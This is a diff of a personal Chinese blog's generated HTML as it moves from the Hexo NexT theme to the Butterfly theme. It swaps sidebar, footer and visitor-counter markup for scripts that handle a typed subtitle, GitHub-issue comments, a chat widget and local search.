title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"><script>window.typedJSFn = {
+  init: str => {
+    window.typed = new Typed('#subtitle', Object.assign({
+      strings: str,
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50,
+    }, null))
+  },
+  run: subtitleType => {
+    if (true) {
+      if (typeof Typed === 'function') {
+        subtitleType()
+      } else {
+        btf.getScript('https://cdn.jsdelivr.net/npm/typed.js@3.0.0/dist/typed.umd.min.js').then(subtitleType)
+      }
+    } else {
+      subtitleType()
     }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  },
+  processSubtitle: (content, extraContents = []) => {
+    if (true) {
+      const sub = ["事已至此，先吃饭吧","歪比巴卜","阿巴阿巴"].slice()
+
+      if (extraContents.length > 0) {
+        sub.unshift(...extraContents)
+      }
+
+      if (typeof content === 'string') {
+        sub.unshift(content)
+      } else if (Array.isArray(content)) {
+        sub.unshift(...content)
+      }
+
+      sub.length > 0 && typedJSFn.init(sub)
+    } else {
+      document.getElementById('subtitle').textContent = typeof content === 'string' ? content :
+        (Array.isArray(content) && content.length > 0 ? content[0] : '')
+    }
+  }
+}
+btf.addGlobalFn('pjaxSendOnce', () => { typed.destroy() }, 'typedDestroy')
+</script><script>function subtitleType () {
+  typedJSFn.processSubtitle(["事已至此，先吃饭吧","歪比巴卜","阿巴阿巴"])
+}
+typedJSFn.run(subtitleType)</script></div><script>window.newestComments = {
+  changeContent: content => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<code>.*?<\/code>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g, "") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0, 150) + '...'
+    }
+    return content
+  },
+
+  generateHtml: (array, ele) => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class="aside-list-item">'
+
+        if (true && array[i].avatar) {
+          const imgAttr = 'src'
+          const lazyloadNative = ''
+          result += `<a href="${array[i].url}" class="thumbnail"><img ${imgAttr}="${array[i].avatar}" alt="${array[i].nick}" ${lazyloadNative}></a>`
+        }
+
+        result += `<div class="content">
+        <a class="comment" href="${array[i].url}" title="${array[i].content}">${array[i].content}</a>
+        <div class="name"><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '暂无评论'
+    }
+
+    ele.innerHTML = result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh(ele)
+  },
+
+  newestCommentInit: (name, getComment) => {
+    const $dom = document.querySelector('#card-newest-comments .aside-list')
+    if ($dom) {
+      const data = btf.saveToLocal.get(name)
+      if (data) {
+        newestComments.generateHtml(JSON.parse(data), $dom)
+      } else {
+        getComment($dom)
       }
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
+  },
+
+  run: (name, getComment) => {
+    newestComments.newestCommentInit(name, getComment)
+    btf.addGlobalFn('pjaxComplete', () => newestComments.newestCommentInit(name, getComment), name)
+  }
+}</script><script>window.addEventListener('load', () => {
+  const keyName = 'github-newest-comments'
+  const { changeContent, generateHtml, run } = window.newestComments
+
+  const findTrueUrl = (array, ele) => {
+    Promise.all(array.map(item =>
+      fetch(item.url).then(resp => resp.json()).then(data => {
+        let urlArray = data.body ? data.body.match(/(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?/ig) : []
+        if (!Array.isArray(urlArray) || urlArray.length === 0) {
+          urlArray = [`${data.html_url}`]
+        }
+        if (data.user.login === 'utterances-bot') {
+          return urlArray.pop()
+        } else {
+          return urlArray.shift()
+        }
+      })
+    )).then(res => {
+        array = array.map((i,index)=> {
+          return {
+            ...i,
+            url: res[index]
+          }
+        })
+
+        btf.saveToLocal.set(keyName, JSON.stringify(array), 10/(60*24))
+        generateHtml(array, ele)
     });
   }
-</script>
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="无星"
-      src="/images/headerPic.png">
-  <p class="site-author-name" itemprop="name">无星</p>
-  <div class="site-description" itemprop="description">一个么的前途的弟中弟</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">174</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">29</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">50</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/XingXiaoWu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;XingXiaoWu" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://www.jianshu.com/u/fef7696741c8" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;fef7696741c8" rel="noopener" target="_blank"><i class="fa fa-link fa-fw"></i>简书</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://juejin.cn/user/1503787636493886" title="掘金 → https:&#x2F;&#x2F;juejin.cn&#x2F;user&#x2F;1503787636493886" rel="noopener" target="_blank"><i class="fa fa-link fa-fw"></i>掘金</a>
-      </span>
-  </div>
-
-
-  <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
-      Links
-    </div>
-    <ul class="links-of-blogroll-list">
-        <li class="links-of-blogroll-item">
-          <a href="https://blog.huan666.de/" title="https:&#x2F;&#x2F;blog.huan666.de&#x2F;" rel="noopener" target="_blank">焕昭君</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://aiiko.club/" title="https:&#x2F;&#x2F;aiiko.club" rel="noopener" target="_blank">爱喵日记</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://www.mikuchan.top/?ref=xingxiaowu.cn" title="https:&#x2F;&#x2F;www.mikuchan.top?ref&#x3D;xingxiaowu.cn" rel="noopener" target="_blank">团子的航海日志</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://dazhuang.store/webp/" title="https:&#x2F;&#x2F;dazhuang.store&#x2F;webp&#x2F;" rel="noopener" target="_blank">大壮</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://www.webshell.cc/" title="https:&#x2F;&#x2F;www.webshell.cc&#x2F;" rel="noopener" target="_blank">WebShell'S Blog</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://blog.fanjunyang.zone/" title="https:&#x2F;&#x2F;blog.fanjunyang.zone&#x2F;" rel="noopener" target="_blank">俊阳的IT主页</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://www.sqlsec.com/" title="https:&#x2F;&#x2F;www.sqlsec.com&#x2F;" rel="noopener" target="_blank">国光</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="http://xiaoqiuxx.xyz/" title="http:&#x2F;&#x2F;xiaoqiuxx.xyz&#x2F;" rel="noopener" target="_blank">xiaoqiuxx's Blog</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://www.hyhforever.top/" title="https:&#x2F;&#x2F;www.hyhforever.top&#x2F;" rel="noopener" target="_blank">HYH's blog</a>
-        </li>
-        <li class="links-of-blogroll-item">
-          <a href="https://www.v2rayfree.eu.org/" title="https:&#x2F;&#x2F;www.v2rayfree.eu.org&#x2F;" rel="noopener" target="_blank">应急链接</a>
-        </li>
-    </ul>
-  </div>
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">无星</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-area"></i>
-    </span>
-      <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">1.3m</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">19:26</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
-  </div>
-<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank" style="display:flex;flex-direction: row;align-items: center;justify-content: center; border:none; color: #999;">
-  由
-  <img src="/images/upaiyun/logo.png"/ style="width:80px;margin:0;">
-  提供CDN加速/云存储服务
-</a>
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="user"></i>
-      </span>
-      <span class="site-uv" title="总访客量">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="eye"></i>
-      </span>
-      <span class="site-pv" title="总访问量">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-</div>
-
-
-
-
-
-
-<script>
-  (function() {
-    function leancloudSelector(url) {
-      url = encodeURI(url);
-      return document.getElementById(url).querySelector('.leancloud-visitors-count');
-    }
-
-    function addCount(Counter) {
-      var visitors = document.querySelector('.leancloud_visitors');
-      var url = decodeURI(visitors.id);
-      var title = visitors.dataset.flagTitle;
-
-      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
-        .then(response => response.json())
-        .then(({ results }) => {
-          if (results.length > 0) {
-            var counter = results[0];
-            leancloudSelector(url).innerText = counter.time + 1;
-            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
-              .catch(error => {
-                console.error('Failed to save visitor count', error);
-              });
-          } else {
-              Counter('post', '/classes/Counter', { title, url, time: 1 })
-                .then(response => response.json())
-                .then(() => {
-                  leancloudSelector(url).innerText = 1;
-                })
-                .catch(error => {
-                  console.error('Failed to create', error);
-                });
+  const getComment = ele => {
+    fetch('https://api.github.com/repos/XingXiaoWu/XingXiaoWu.github.io/issues/comments?sort=updated&direction=desc&per_page=6&page=1',{
+      "headers": {
+        Accept: 'application/vnd.github.v3.html+json'
+      }
+    })
+      .then(response => response.json())
+      .then(data => {
+        const githubArray = data.map(item => {
+          return {
+            'avatar': item.user.avatar_url,
+            'content': changeContent(item.body_html || item.body),
+            'nick': item.user.login,
+            'url': item.issue_url,
+            'date': item.updated_at
           }
         })
-        .catch(error => {
-          console.error('LeanCloud Counter Error', error);
-        });
-    }
+        findTrueUrl(githubArray, ele)
+      }).catch(e => {
+        console.error(e)
+        ele.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+  }
+  run(keyName, getComment)
+})</script><script>(() => {
+  btf.getScript('//code.tidio.co/8bedg9ebrxiovjwd7m9vzmap6dbvl0jf.js').then(() => {
+    const isChatBtn = false
+    const isChatHideShow = false
 
-    function showTime(Counter) {
-      var visitors = document.querySelectorAll('.leancloud_visitors');
-      var entries = [...visitors].map(element => {
-        return decodeURI(element.id);
-      });
+    if (isChatBtn) {
+      let isShow = false
+      const close = () => {
+        window.tidioChatApi.hide()
+        isShow = false
+      }
+      
+      const open = () => {
+        window.tidioChatApi.open()
+        window.tidioChatApi.show()
+        isShow = true
+      }
 
-      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
-        .then(response => response.json())
-        .then(({ results }) => {
-          for (let url of entries) {
-            let target = results.find(item => item.url === url);
-            leancloudSelector(url).innerText = target ? target.time : 0;
-          }
-        })
-        .catch(error => {
-          console.error('LeanCloud Counter Error', error);
-        });
-    }
+      const onTidioChatApiReady = () => {
+        window.tidioChatApi.hide()
+        window.tidioChatApi.on("close", close)
+      }
+      if (window.tidioChatApi) {
+        window.tidioChatApi.on("ready", onTidioChatApiReady)
+      } else {
+        document.addEventListener("tidioChat-ready", onTidioChatApiReady)
+      }
 
-    let { app_id, app_key, server_url } = {"enable":true,"app_id":"pnwsxTh3sKr3Lb0RG3KCrFxX-gzGzoHsz","app_key":"CKxxpzPHaBUuiudduqDrkBUk","server_url":null,"security":false};
-    function fetchData(api_server) {
-      var Counter = (method, url, data) => {
-        return fetch(`${api_server}/1.1${url}`, {
-          method,
-          headers: {
-            'X-LC-Id'     : app_id,
-            'X-LC-Key'    : app_key,
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(data)
-        });
-      };
-      if (CONFIG.page.isPost) {
-        if (CONFIG.hostname !== location.hostname) return;
-        addCount(Counter);
-      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
-        showTime(Counter);
+      window.chatBtnFn = () => {
+        if (!window.tidioChatApi) return
+        isShow ? close() : open()
+      }
+
+      document.getElementById('chat-btn').style.display = 'block'
+
+    } else if (isChatHideShow) {
+      window.chatBtn = {
+        hide: () => window.tidioChatApi && window.tidioChatApi.hide(),
+        show: () => window.tidioChatApi && window.tidioChatApi.show()
       }
     }
-
-    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
-
-    if (api_server) {
-      fetchData(api_server);
-    } else {
-      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
-        .then(response => response.json())
-        .then(({ api_server }) => {
-          fetchData('https://' + api_server);
-        });
-    }
-  })();
-</script>
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-  <script>
-    (function(){
-      var canonicalURL, curProtocol;
-      //Get the <link> tag
-      var x=document.getElementsByTagName("link");
-		//Find the last canonical URL
-		if(x.length > 0){
-			for (i=0;i<x.length;i++){
-				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
-					canonicalURL=x[i].href;
-				}
-			}
-		}
-    //Get protocol
-	    if (!canonicalURL){
-	    	curProtocol = window.location.protocol.split(':')[0];
-	    }
-	    else{
-	    	curProtocol = canonicalURL.split(':')[0];
-	    }
-      //Get current URL if the canonical URL does not exist
-	    if (!canonicalURL) canonicalURL = window.location.href;
-	    //Assign script content. Replace current URL with the canonical URL
-      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
-  </script>
-
-
-
-
-  
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-
-  <style>
-    #forkongithub a{
-      background:#000;color:#fff;
-      text-decoration:none;font-family:arial,sans-serif;
-      text-align:center;font-weight:bold;padding:5px 40px;
-      font-size:1rem;line-height:2rem;position:relative;transition:0.5s;
-    }
-    #forkongithub a:hover{background:#c11;color:#fff;}
-    #forkongithub a::before,#forkongithub a::after{content:"";width:100%;display:block;position:absolute;top:1px;left:0;height:1px;background:#fff;}
-    #forkongithub a::after{bottom:1px;top:auto;}
-    @media screen and (min-width:800px){
-      #forkongithub{position:fixed;display:block;top:0;right:0;width:200px;overflow:hidden;height:200px;z-index:9999;
-    }
-    #forkongithub a{
-      width:200px;
-      position:absolute;top:60px;right:-60px;
-      transform:rotate(45deg);-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);-moz-transform:rotate(45deg);-o-transform:rotate(45deg);
-      box-shadow:4px 4px 10px rgba(0,0,0,0.8);
-    }
-  </style>
-</body>
-</html>
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索一号准备就绪" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
